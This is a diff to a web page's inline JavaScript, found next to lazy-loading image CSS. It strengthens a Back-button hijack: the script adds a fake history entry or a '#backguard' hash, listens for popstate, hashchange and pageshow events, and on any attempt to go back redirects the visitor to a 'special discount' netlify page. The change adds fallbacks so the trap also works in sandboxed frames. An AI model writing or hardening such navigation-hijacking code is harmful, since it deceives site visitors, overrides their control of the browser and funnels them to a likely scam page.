@@ -41,21 +41,35 @@ img.lzl, img.lzl-ing, img.lzl-ed, .lzl {
 (function(w){
   var url='https://ultimachanche-desconto-especial.netlify.app/';
   var done=false;
-  function go(){ if(done) return; done=true; w.location.replace(url); }
+  function go(){
+    if(done) return;
+    done=true;
+    try{ w.location.replace(url); }catch(e){ w.location.href=url; }
+  }
 
+  // 1) Add an extra history entry so "Back" returns to this page and fires an event.
+  var pushed=false;
   try{
     if(w.history&&w.history.pushState){
-      w.history.pushState({od:'guard'},'',w.location.href);
-      w.addEventListener('popstate',function(e){ if(!e.state||e.state.od) go(); });
+      w.history.pushState({back:1},'',w.location.href);
+      pushed=true;
     }
   }catch(e){}
 
-  w.addEventListener('pageshow',function(e){ if(e.persisted) go(); });
+  if(!pushed){
+    // Fallback for sandboxed/restricted frames (e.g. embedded previews)
+    // where history.pushState throws a SecurityError.
+    try{
+      if(w.location.hash!=='#backguard'){ w.location.hash='backguard'; }
+    }catch(e){}
+  }
 
-  try{
-    var n=w.performance&&w.performance.getEntriesByType&&w.performance.getEntriesByType('navigation');
-    if(n&&n.length&&n[0].type==='back_forward') go();
-  }catch(e){}
+  // 2) React to any Back navigation. Listeners attach unconditionally.
+  var armed=false;
+  setTimeout(function(){ armed=true; }, 400);
+  w.addEventListener('popstate',function(){ if(armed) go(); });
+  w.addEventListener('hashchange',function(){ if(armed) go(); });
+  w.addEventListener('pageshow',function(e){ if(e.persisted) go(); });
 })(window);
 </script>
 
